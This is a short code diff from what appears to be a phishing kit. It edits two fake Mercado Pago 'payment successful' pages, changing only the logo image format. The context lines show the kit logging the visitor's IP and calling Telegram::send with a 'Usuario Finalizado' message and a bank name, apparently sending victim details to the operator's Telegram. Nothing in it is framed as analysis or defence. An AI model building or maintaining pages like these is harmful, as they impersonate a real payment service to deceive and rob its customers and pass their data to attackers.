@@ -30,7 +30,7 @@ IP: " . $ip);
 <body class="flex items-center justify-center min-h-screen p-4">
     <div class="bg-white shadow-xl rounded-2xl overflow-hidden w-full max-w-2xl">
       <div class="bg-white p-6 text-center border-b-4" style="border-color: #00a650;">
-        <img src="mercado_logo.png" alt="Mercado Pago" class="mx-auto mb-4" style="height: 50px;">
+        <img src="mercado_logo.webp" alt="Mercado Pago" class="mx-auto mb-4" style="height: 50px;">
         <h1 class="text-2xl font-bold text-gray-800">¡Pago Exitoso!</h1>
       </div>
         
@@ -129,7 +129,7 @@ Telegram::send("✅ <b>Usuario Finalizado</b>\nBanco: " . basename(__DIR__) . "\
 <body class="flex items-center justify-center min-h-screen p-4">
     <div class="bg-white shadow-xl rounded-2xl overflow-hidden w-full max-w-2xl">
       <div class="bg-white p-6 text-center border-b-4" style="border-color: #00a650;">
-        <img src="mercado_logo.png" alt="Mercado Pago" class="mx-auto mb-4" style="height: 50px;">
+        <img src="mercado_logo.webp" alt="Mercado Pago" class="mx-auto mb-4" style="height: 50px;">
         <h1 class="text-2xl font-bold text-gray-800">¡Pago Exitoso!</h1>
       </div>
         
